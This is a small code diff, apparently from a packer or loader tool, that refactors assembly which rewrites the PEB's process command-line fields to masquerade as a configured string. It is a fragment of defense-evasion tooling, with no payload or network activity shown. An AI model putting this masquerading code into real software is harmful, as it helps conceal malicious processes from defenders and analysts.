@@ -4,7 +4,7 @@
     mov rax, PEB
     mov rax, [rax + 0x20]
     mov si,  [rax + 0x62]
-    cmp si,  2 * (lstrlenA(Options.Packing.Masquerade + 1))
+    cmp si,  2 * (strnlen(reinterpret_cast<const char*>(std::get<Buffer>(config["Packing.sMasquerade"]).Data()), std::get<Buffer>(config["Packing.sMasquerade"]).Size()) + 1)
     strict
     jle not_found
 
@@ -47,8 +47,8 @@ zero_remainder:
     ; bx  = Length
     ; cx  = MaximumLength
     ; rdx = Buffer
-    mov bx, 2 * lstrlen(Options.Packing.Masquerade) ; Get data
-    mov cx, 2 * (lstrlenA(Options.Packing.Masquerade) + 1)
+    mov bx, 2 * strnlen(reinterpret_cast<const char*>(std::get<Buffer>(config["Packing.sMasquerade"]).Data()), std::get<Buffer>(config["Packing.sMasquerade"]).Size()) ; Get data
+    mov cx, 2 * (strnlen(reinterpret_cast<const char*>(std::get<Buffer>(config["Packing.sMasquerade"]).Data()), std::get<Buffer>(config["Packing.sMasquerade"]).Size()) + 1)
     mov rdx, [rax + 0x68]
     mov [rax + 0x70], bx ; CommandLine
     mov [rax + 0x72], cx
